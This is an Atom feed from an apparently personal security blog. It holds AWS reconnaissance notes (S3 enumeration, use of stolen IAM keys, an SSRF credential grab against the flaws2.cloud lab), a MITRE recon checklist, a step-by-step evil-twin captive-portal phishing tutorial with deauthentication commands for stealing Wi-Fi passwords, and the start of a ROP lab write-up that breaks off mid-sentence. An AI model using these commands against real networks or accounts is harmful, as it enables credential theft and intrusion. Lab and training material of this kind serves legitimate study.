<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://geleiaa.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://geleiaa.github.io/" rel="alternate" type="text/html"/><updated>2024-05-15T13:38:20+00:00</updated><id>https://geleiaa.github.io/feed.xml</id><title type="html">blank</title><subtitle>Blog de hackinagens. </subtitle><entry><title type="html">aws recon</title><link href="https://geleiaa.github.io/blog/2024/aws_recon/" rel="alternate" type="text/html" title="aws recon"/><published>2024-04-14T00:00:00+00:00</published><updated>2024-04-14T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/aws_recon</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/aws_recon/"><![CDATA[<h2 id="external-and-internal-recon">External and Internal Recon</h2> <blockquote> <h2 id="s3-enum">S3 enum</h2> </blockquote> <h4 id="externalpublicunauthenticated">External/Public/Unauthenticated</h4> <p>1 - https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-s3-unauthenticated-enum</p> <p>2 - Discovering Bucket Names:</p> <p>There are many ways to discover the names of Buckets. One of the easiest ways is when a company embeds content hosted in S3 on their website. Images, PDFs, etc., can all be hosted cheaply in S3 and linked from another site. These links will look like this:</p> <ul> <li><code class="language-plaintext highlighter-rouge">http://BUCKETNAME.s3.amazonaws.com/FILENAME.ext</code> or <code class="language-plaintext highlighter-rouge">http://s3.amazonaws.com/BUCKETNAME/FILENAME.ext</code></li> </ul> <p>3 - Find public IP to see if it is s3 aws:</p> <ul> <li><code class="language-plaintext highlighter-rouge">$ dig sub.domain.com</code> and <code class="language-plaintext highlighter-rouge">$ nslookup IP</code></li> <li><code class="language-plaintext highlighter-rouge">$ dig +nocmd flaws.cloud any +multiline +noall +answer</code> and <code class="language-plaintext highlighter-rouge">$ nslookup IP</code></li> </ul> <p>4 - Enumerate Bucket:</p> <ul> <li>To test the openness of the bucket a user can just enter the URL in their web browser. A private bucket will respond with “Access Denied”. A public bucket will list the first 1,000 objects that have been stored.</li> </ul> <p>5 - Listing the Contents of Buckets:</p> <ul> <li><code class="language-plaintext highlighter-rouge">$ curl http://BUCKETNAME.s3.amazonaws.com/</code></li> <li><code class="language-plaintext highlighter-rouge">$ aws s3 ls s3://irs-form-990/ --no-sign-request</code></li> </ul> <p>6 - Downloading Objects:</p> <ul> <li><code class="language-plaintext highlighter-rouge">$ curl http://irs-form-990.s3.amazonaws.com/201101319349101615_public.xml</code></li> <li><code class="language-plaintext highlighter-rouge">$ aws s3 cp s3://irs-form-990/201101319349101615_public.xml . --no-sign-request</code></li> </ul> <h4 id="internalauthenticated">Internal/Authenticated</h4> <ul> <li>https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum#enumeration</li> </ul> <p>1 - Listing the Contents of Buckets:</p> <ul> <li><code class="language-plaintext highlighter-rouge">aws s3 --profile YOUR_ACCOUNT ls s3://BUCKET-NAME</code></li> </ul> <p>2 - S3 misconfig series:</p> <ol> <li>http://flaws.cloud/</li> <li>http://flaws.cloud/hint1.html</li> <li>http://flaws.cloud/hint2.html</li> <li>http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/</li> <li>http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html</li> <li>http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/</li> <li>http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/hint1.html</li> <li>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/</li> <li>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html</li> <li>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html</li> <li>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint3.html</li> <li>http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/hint2.html</li> <li>http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/hint3.html</li> <li>http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</li> <li>http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint1.html</li> <li>http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/hint2.html</li> <li>http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/</li> <li>http://level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud/ (lambda leak envs with creds)</li> </ol> <blockquote> <h2 id="iam">IAM</h2> </blockquote> <p>1 - https://hackingthe.cloud/aws/general-knowledge/using_stolen_iam_credentials/</p> <ul> <li>https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-basic-information#cli-authentication</li> </ul> <p>When you find credentials to AWS, you can add them to your AWS Profile in the AWS CLI. For this, you use the command:</p> <p>https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-files.html#cli-configure-files-using-profiles</p> <p><code class="language-plaintext highlighter-rouge">aws configure --profile PROFILENAME</code></p> <p>This command will add entries to the .aws/config and .aws/credentials files in your user’s home directory.</p> <p><code class="language-plaintext highlighter-rouge">ProTip: Never store a set of access keys in the [default] profile. Doing so forces you always to specify a profile and never accidentally run a command against an account you don't intend to.</code></p> <p>2 - A few other common AWS reconnaissance techniques are:</p> <ul> <li>Finding the Account ID belonging to an access key: <ul> <li><code class="language-plaintext highlighter-rouge">aws sts get-access-key-info --access-key-id AKIAEXAMPLE</code></li> </ul> </li> <li>Determining the Username the access key you’re using belongs to <ul> <li><code class="language-plaintext highlighter-rouge">aws sts get-caller-identity --profile PROFILENAME</code></li> </ul> </li> <li>Listing all the EC2 instances running in an account <ul> <li><code class="language-plaintext highlighter-rouge">aws ec2 describe-instances --output text --profile PROFILENAME</code></li> </ul> </li> <li>Listing all the EC2 instances running in an account in a different region <ul> <li><code class="language-plaintext highlighter-rouge">aws ec2 describe-instances --output text --region us-east-1 --profile PROFILENAME</code></li> </ul> </li> </ul> <p>3 - Enum Policies</p> <ul> <li> <p>https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-iam-enum</p> </li> <li>Get metadata of user <ul> <li><code class="language-plaintext highlighter-rouge">aws --profile PROFILE-NAME iam get-user</code></li> </ul> </li> <li>Get policies of user <ul> <li><code class="language-plaintext highlighter-rouge">aws --profile PROFILE-NAME iam list-attached-user-policies --user-name CURRENT-OR-OTHER</code></li> </ul> </li> <li>Get policy content <ul> <li><code class="language-plaintext highlighter-rouge">aws --profile PROFILE-NAME iam get-policy --policy-arn &lt;policy_arn&gt;</code></li> <li><code class="language-plaintext highlighter-rouge">aws iam get-policy-version --policy-arn &lt;arn:aws:iam::975426262029:policy/list_apigateways&gt; --version-id &lt;VERSION_X&gt;</code></li> </ul> </li> </ul> <blockquote> <h2 id="ec2">EC2</h2> </blockquote> <h4 id="internalauthenticated-1">Internal/Authenticated</h4> <ul> <li> <p>https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum</p> </li> <li>Discovery snapshots <ul> <li><code class="language-plaintext highlighter-rouge">aws --profile PROFILE-NAME ec2 describe-snapshots --owner-id ACCOUNT-ID</code></li> </ul> </li> <li>Snapshot Dump <ul> <li>https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump</li> <li>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint1.html</li> <li>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint2.html</li> <li>http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud/hint3.html</li> </ul> </li> </ul> <blockquote> <h2 id="ecr-elastic-container-registry">ECR (Elastic Container Registry)</h2> </blockquote> <h4 id="internalauthenticated-2">Internal/Authenticated</h4> <ul> <li>Get repos <ul> <li><code class="language-plaintext highlighter-rouge">aws ecr describe-repositories --profile PROFILE-NAME</code></li> <li><code class="language-plaintext highlighter-rouge">aws ecr describe-registry --profile PROFILE-NAME</code></li> </ul> </li> <li>Get image metadata <ul> <li> <p><code class="language-plaintext highlighter-rouge">aws ecr list-images --repository-name &lt;repo_name&gt; --profile PROFILE-NAME</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">aws ecr list-images --repository-name &lt;repo_name&gt; --resgistry-id ACCOUNT-ID --profile PROFILE-NAME</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">aws ecr batch-get-image --repository-name level2 --registry-id 653711331788 --image-ids imageTag=latest | jq '.images[].imageManifest | fromjson'</code></p> </li> <li> <p><code class="language-plaintext highlighter-rouge">aws ecr get-download-url-for-layer --repository-name level2 --registry-id 653711331788 --layer-digest "sha256:..."</code></p> </li> </ul> </li> <li>Login, Pull &amp; Push <ul> <li>login - <code class="language-plaintext highlighter-rouge">aws ecr --profile PROFILE-NAME get-login-password --region REGION | docker login --username AWS --password-stdin ACCOUNT-ID.dkr.ecr.REGION.amazonaws.com</code></li> <li>pull image - <code class="language-plaintext highlighter-rouge">docker pull &lt;account_id&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;img_name&gt;:latest</code></li> </ul> </li> <li>Get image metadata <ul> <li><code class="language-plaintext highlighter-rouge">aws ecr describe-images --repository-name level2 --profile PROFILE-ID</code></li> </ul> </li> <li>SSRF in AWS ECS (Container Service) <ul> <li>https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#ssrf-in-aws-ecs-container-service-credentials</li> <li>https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html <ol> <li><code class="language-plaintext highlighter-rouge">curl -v http://container.target.flaws2.cloud/proxy/file:///proc/self/environ -o environ</code></li> <li>In “environ” output file found variable “AWS_CONTAINER_CREDENTIALS_RELATIVE_URI” copy paste in next curl cli:</li> <li><code class="language-plaintext highlighter-rouge">curl -v http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/credentials/cd0f067f-f28a-4f8a-ba76-0e697ec1d289</code></li> <li>Get creds …</li> </ol> </li> </ul> </li> </ul> <blockquote> <p>constantly adding more …</p> </blockquote>]]></content><author><name></name></author><category term="cloud"/><category term="recon"/><summary type="html"><![CDATA[aws recon and misconfig notes]]></summary></entry><entry><title type="html">mitre attack recon method</title><link href="https://geleiaa.github.io/blog/2024/mitre_recon/" rel="alternate" type="text/html" title="mitre attack recon method"/><published>2024-03-04T00:00:00+00:00</published><updated>2024-03-04T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/mitre_recon</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/mitre_recon/"><![CDATA[<h2 id="mitre-recon">Mitre Recon</h2> <p>Essa lista é uma ordem lógica das fases de recon baseado no mitre-pre <a href="https://attack.mitre.org/matrices/enterprise/pre/">https://attack.mitre.org/matrices/enterprise/pre/</a>. A ordem das fases é como eu vejo a melhor forma de se organizar e executar um recon em uma empresa/organização, isso vai desde osint basico até o início da enumeração de rede/ativos.</p> <h3 id="1---gather-victim-org-information">1 - Gather Victim Org Information</h3> <ul> <li><a href="https://attack.mitre.org/techniques/T1591/">https://attack.mitre.org/techniques/T1591/</a></li> <li>Determine Physical Locations</li> <li>Business Relationships</li> <li>Identify Business Tempo</li> <li>Identify Roles</li> </ul> <h3 id="2---gather-victim-identity-information">2 - Gather Victim Identity Information</h3> <p><a href="https://attack.mitre.org/techniques/T1589/">https://attack.mitre.org/techniques/T1589/</a></p> <p>Credentials</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1589/001/">https://attack.mitre.org/techniques/T1589/001/</a></li> </ul> <p>Email Address</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1589/002/">https://attack.mitre.org/techniques/T1589/002/</a></li> </ul> <p>Employee Names</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1589/003/">https://attack.mitre.org/techniques/T1589/003/</a></li> </ul> <h3 id="3---search-open-websitesdomains">3 - Search Open Websites/Domains</h3> <p><a href="https://attack.mitre.org/techniques/T1593/">https://attack.mitre.org/techniques/T1593/</a></p> <ul> <li><a href="https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e">https://cyware.com/news/how-hackers-exploit-social-media-to-break-into-your-company-88e8da8e</a></li> <li><a href="https://securitytrails.com/blog/google-hacking-techniques">https://securitytrails.com/blog/google-hacking-techniques</a></li> <li><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></li> </ul> <p>Social media</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1593/001/">https://attack.mitre.org/techniques/T1593/001/</a></li> </ul> <p>Code Repositories (github search)</p> <h3 id="4---search-open-technical-databases">4 - Search Open Technical Databases</h3> <p><a href="https://attack.mitre.org/techniques/T1596/">https://attack.mitre.org/techniques/T1596/</a></p> <ul> <li>some whois</li> <li>passive dns - <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></li> <li>digital certs - <a href="https://www.sslshopper.com/ssl-checker.html">https://www.sslshopper.com/ssl-checker.html</a></li> <li>CDNs</li> <li>shodan and others…</li> </ul> <h3 id="5---search-victim-owned-websites">5 - Search Victim-Owned Websites</h3> <p><a href="https://attack.mitre.org/techniques/T1594/">https://attack.mitre.org/techniques/T1594/</a></p> <h3 id="6---search-closed-sources">6 - Search Closed Sources</h3> <p>Threat Intel Vendors</p> <ul> <li><a href="https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/">https://d3security.com/blog/10-of-the-best-open-source-threat-intelligence-feeds/</a></li> <li><a href="https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/">https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/</a></li> </ul> <h3 id="7---gather-victim-network-information">7 - Gather Victim Network Information</h3> <p>FQDNs</p> <ul> <li><a href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/">https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/</a></li> </ul> <p>Network Trust Dependencies</p> <ul> <li><a href="https://www.slideshare.net/rootedcon/carlos-garca-pentesting-active-directory-forests-rooted2019">https://www.slideshare.net/rootedcon/carlos-garca-pentesting-active-directory-forests-rooted2019</a></li> </ul> <p>IP Addresses</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1590/005/">https://attack.mitre.org/techniques/T1590/005/</a></li> </ul> <p>Network Security Appliances</p> <ul> <li><a href="https://nmap.org/book/firewalls.html">https://nmap.org/book/firewalls.html</a></li> </ul> <h3 id="8---gather-victim-host-information">8 - Gather Victim Host Information</h3> <p>Software</p> <ul> <li><a href="https://attack.mitre.org/techniques/T1592/002/">https://attack.mitre.org/techniques/T1592/002/</a></li> </ul> <h3 id="9---phishing-for-information">9 - Phishing for Information</h3> <p><a href="https://attack.mitre.org/techniques/T1598/">https://attack.mitre.org/techniques/T1598/</a></p> <h3 id="10---active-scanning">10 - Active Scanning</h3> <p>Scanning IP Blocks</p> <p>Vulnerability Scanning <a href="https://attack.mitre.org/techniques/T1595/002/">https://attack.mitre.org/techniques/T1595/002/</a></p> <p>Wordlist Scanning (brute-force)</p> <ul> <li><a href="https://github.com/clarketm/s3recon">https://github.com/clarketm/s3recon</a></li> <li><a href="https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/">https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/</a></li> </ul>]]></content><author><name></name></author><category term="bhatagem"/><category term="recon"/><summary type="html"><![CDATA[mitre recon notes]]></summary></entry><entry><title type="html">captive-portal attack com eaphammer</title><link href="https://geleiaa.github.io/blog/2024/captive_portal/" rel="alternate" type="text/html" title="captive-portal attack com eaphammer"/><published>2024-02-15T00:00:00+00:00</published><updated>2024-02-15T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/captive_portal</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/captive_portal/"><![CDATA[<h2 id="ataque-de-captive-portal-com-eaphammer">Ataque de Captive Portal com eaphammer</h2> <h4 id="o-ataque-de-captive-portal-consiste-em-subir-uma-rede-wifi-falsa-imitando-a-rede-alvo-aka-rogue-ap-fake-ap-ou-evil-twin-para-que-os-clientes-da-rede-alvo-se-conectem-na-rede-falsa-caiam-em-uma-pagina-phishing-e-assim-passem-a-psk-da-rede-legítima">O ataque de captive-portal consiste em subir uma rede wifi falsa imitando a rede alvo (aka rogue ap, fake ap ou evil twin), para que os clientes da rede alvo se conectem na rede falsa, caiam em uma pagina phishing e assim passem a psk da rede legítima.</h4> <p>Para esse ataque você vai precisar de:</p> <p>1 - a tool eaphammer (https://github.com/s0lst1c3/eaphammer)</p> <p>2 - um adaptador wireless que suporte o modo AP(access point)</p> <p>3 - um adaptador wireless que suporte o modo Monitor</p> <p>4 - algum conhecimento basico de frontend</p> <h3 id="1---escolhendo-a-pagina-de-phishing">1 - escolhendo a pagina de phishing:</h3> <p>A pagina de phishing pode depender do cenario em que o ataque será feito, então fica a critério do atacante escolher a mais adequada.</p> <p>Para esse tutorial vou usar uma pagina que é usada em outra tool de wifi hacking, a tool wifiphishing. Essa pagina simula uma atualização de firmware do roteador: https://wifiphisher.org/ps/firmware-upaginarade/</p> <h3 id="2---clonando-a-pagina-de-phishing-para-a-tool-adicionando-template">2 - clonando a pagina de phishing para a tool (adicionando template):</h3> <p>A tool eaphammer tem uma opção de clonar paginas para serem usadas nos ataques de captive portal. Então vamos clonar a pagina para usar no nosso ataque:</p> <p>Nota: Tive problemas para clonar a pagina direto do link acima, então tive que fazer download dos arquivos e subila-la localmente pelo apache para assim clonar usando a tool. A pagina é feita de simples arquivos estaticos. A estrutura do dir deve ficar assim:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/var/www/html
├── asus.png
├── bootstrap.min.css
├── bootstrap.min.js
├── jquery.min.js
└── index.html
</code></pre></div></div> <p>Faça download dos arquivos da pagina, mova-os para /var/www/html, starte o serviço do apache e acesse o localhost (127.0.0.1) no navegador.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/pihishrouterpg.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Nessa parte você precisa ajustar os paths dos arquivos estaticos de css (no html) para a pagina ficar legivel (aqui que entra o conhecimento de frontend). Se a pagina estiver normal, rode o seguinte comando para clona-la:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ #./eaphammer --create-template --name firm-update --description "description..." --url http://127.0.0.1/
</code></pre></div></div> <p>Para confirmar que a pagina foi clonada você pode listar os templates disponiveis:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└──╼ #./eaphammer --list-templates

[*] Listing available captive portal templates:

download         - Prompt targets to download an implant.
login            - Present user with a login page. Includes embedded realtime keylogger.
firm-update      - router firmware update page    &lt;===========
</code></pre></div></div> <h3 id="3---editando-a-pagina-template">3 - editando a pagina (template):</h3> <p>Durante meus testes com a pagina de phishing clonada tive problemas para receber a psk que é mandado pelo frontend para o backend da tool. Fazendo debugging nas requests enviadas e recebidas, percebi que quando a tool sobe a pagina ela injeta um código javascript que é usado para mandar os dados recebidos no frontend para o backend e assim mostrado nos logs do terminal… esse js espera receber um body mais ou menos assim <code class="language-plaintext highlighter-rouge">{username: name, password: pass}</code>.</p> <p>Então se você se deparar com esse problema, para resolver vá até os arquivos do template da pagina clonada em <code class="language-plaintext highlighter-rouge">eaphammer/templates/seu-templete/</code> e adicione um campo de “username” junto ao campo de “password” dessa forma(com os atributos html também):</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;input type='text' name='username' value='TARGET-ESSID'/&gt;&lt;br/&gt;
&lt;input type='password' name='password'/&gt;&lt;br/&gt;
</code></pre></div></div> <p>Adicione também o atributo method=’post’ na tag do form, caso não tenha.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form method='POST'&gt;
</code></pre></div></div> <p>(veja os templates default para mais exemplos)</p> <p>Dica: Para colaborar com a pagina de phishing o campo username pode ser o essid da rede alvo como valor default (value=’TARGET-ESSID’).</p> <p>Você tera que editar a pagina antes de subir a rede falsa. Fazendo isso o backend da tool vai receber os dados normalmente.</p> <p>Depois de alterações o pagina deve ficar assim:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/inputhtmledit.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/pgrendered.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Nota: Você pode fazer o mesmo processo de editar o html para mudar outras partes, como o logo do vendor do roteador alvo, traduzir a pagina para portugues e etc. Isso para aumentar a credibilidade do phishing (fica critério do atacante).</p> <h3 id="4---subindo-o-fake-ap">4 - subindo o fake ap:</h3> <p>Agora é a hora que vamos precisar usar as duas placas de rede (adaptadores) ou só uma, se a placa suportar os modos necessarios. Para essa demonstração usei placas com os seguintes chipsets: RTL8812AU (suporta modo AP) e RTL8192EU (suporta modo Mon)</p> <h4 id="starte-o-fake-ap-com-a-placa-que-suporta-ap">Starte o fake ap com a placa que suporta AP:</h4> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./eaphammer --captive-portal --portal-template seu-template --essid "TARGET-ESSID" --channel TARGET-CHANNEL --bssid 11:22:33:44:55:66 --interface INTERFACE-NAME
</code></pre></div></div> <p>Dica:</p> <ul> <li>em <code class="language-plaintext highlighter-rouge">--essid</code> deve ser o mesmo nome do alvo para ser convincente.</li> <li>O <code class="language-plaintext highlighter-rouge">--bssid</code> deve ser parecido com o da rede alvo, alterando apenas um numero em qualquer lugar (de preferencia o ultimo), porque um mac igual ao da rede alvo pode conflitar na hora de mandar deauths. Ex: mac alvo = 1C:7E:E5:97:79:B1, mac fake ap = 1C:7E:E5:97:79:B2.</li> </ul> <p>Se estiver tudo certo o fake ap vai ser iniciado como uma rede OPEN e você poderá ve-la igual qualquer outra rede (mas não se conecte a rede quando estiver fazendo o ataque). Você verá nos logs do terminal que o ap está ativo:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/fakeapok.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>exemplo de visão do alvo</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/clientexample.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h4 id="deauth-na-rede-alvo">Deauth na rede alvo:</h4> <p>Depois que o fake ap estiver up e esperando conexões você deve desautenticar os clientes da rede alvo para que eles possam se conectar no fake ap. Use o aireplay-ng pra isso:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng -0 0 -a TARGET-AP-MAC INTEFACE-NAME
</code></pre></div></div> <p>Dica: o comando acima manda deauth para o broadcast da rede alvo, ou seja, todos os clientes vão receber os pacotes de deauth. Essa é a melhor forma porque não adianta muito você desautenticar apenas um cliente e os outros continuarem conectados normalmente, e você também corre o risco de ser percebido por causa das diferença da rede legitima e a falsa.</p> <h4 id="logs-do-fake-ap">logs do fake ap:</h4> <p>Quando alguém se conectar ao fake ap, os logs vão aparecer na tela do terminal junto com os logs do DNS-spoofing funcionando e redirecionando os dispositivos conectados para a pagina de phishing:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/clientconect.png" class="img-fluid rounded z-depth-1" width="800" height="800" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Conforme o client vai tentando acessar outras paginas pelo navegador o ataque de spoofing continua redirencionando para a pagina de phishing.</p> <p>exemplo de visão do alvo em smartphone</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/phoneexample.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>O client conectado verá o pagina de atualização de firmware e se a sua eng-social der certo, ele digitara a senha pensando que há uma atualização de firmware do roteador… e a psk digitada vai aparecer nos logs do fake ap:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/recvpsk.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div>]]></content><author><name></name></author><category term="bhatagem"/><category term="wifi"/><summary type="html"><![CDATA[recuperando psk ...]]></summary></entry><entry><title type="html">ROP lab RPISEC</title><link href="https://geleiaa.github.io/blog/2024/rop_lab/" rel="alternate" type="text/html" title="ROP lab RPISEC"/><published>2024-01-12T00:00:00+00:00</published><updated>2024-01-12T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2024/rop_lab</id><content type="html" xml:base="https://geleiaa.github.io/blog/2024/rop_lab/"><![CDATA[<h3 id="solving-lab5c-0313---rop-lab-httpsgithubcomrpisecmbeblobmastersrclab05lab5cc">Solving lab5C “03/13 | –[ ROP Lab” (https://github.com/RPISEC/MBE/blob/master/src/lab05/lab5C.c)</h3> <h3 id="this-lab-is-related-to-the-exploration-of-depnx">This lab is related to the exploration of DEP/NX.</h3> <p>First I’ll talk about the problem I had with compiling the binary. This lab is made for 32-bit architecture and the exploit is also 32-bit based. And my idea was to do it in 64. So, due to some problems with address randomization, I had to add the <code class="language-plaintext highlighter-rouge">-no-pie</code> flag to compile it. It was compiled like this:</p> <p><code class="language-plaintext highlighter-rouge">gcc lab5C.c -o lab5C -fno-stack-protector -no-pie</code></p> <p>As the exploration learned in the slides is for 32 bits, I had to use a technique aimed at 64 bits. I did a step by step of this technique here: https://geleiaa.github.io/blog/2024/bypass_NX/</p> <p>And now let’s see how it was applied in this binary.</p> <p>Let’s look at the source code to see what the binary does.</p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span>
<span class="cm">/* gcc -fno-stack-protector -o lab5C lab5C.c */</span>

<span class="kt">char</span> <span class="n">global_str</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>

<span class="cm">/* reads a string, copies it to a global */</span>
<span class="kt">void</span> <span class="nf">copytoglobal</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">global_str</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"I included libc for you...</span><span class="se">\n</span><span class="s">"</span>\
           <span class="s">"Can you ROP to system()?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">copytoglobal</span><span class="p">();</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <p>It looks like simple code. The main prints some text. And the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function does exactly that, it takes what comes from stdin and passes it to the global variable.</p> <p>Running the binary:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/runbinrop.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="to-begin-the-exploration-lets-see-if-we-can-overflow-this-buffer-that-stores-the-input">To begin the exploration, let’s see if we can overflow this buffer that stores the input.</h3> <p>Arriving at the RET of the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function we see that it was overwritten after 136 bytes of our pattern:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/retoverwriterop.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Now that we know how to overwrite the return address of the <code class="language-plaintext highlighter-rouge">copytoglobal()</code> function, let’s go with the ROP + ret2libc techniques.</p> <h3 id="rop--ret2libc">ROP + ret2libc</h3> <p>For this exploration we will need three things: 1 - address of the <code class="language-plaintext highlighter-rouge">system()</code> function, 2 - an argument to system(), 3 - gadgets that put this argument in the right place.</p> <p>First the Gadgets. We need a “pop rdi” so 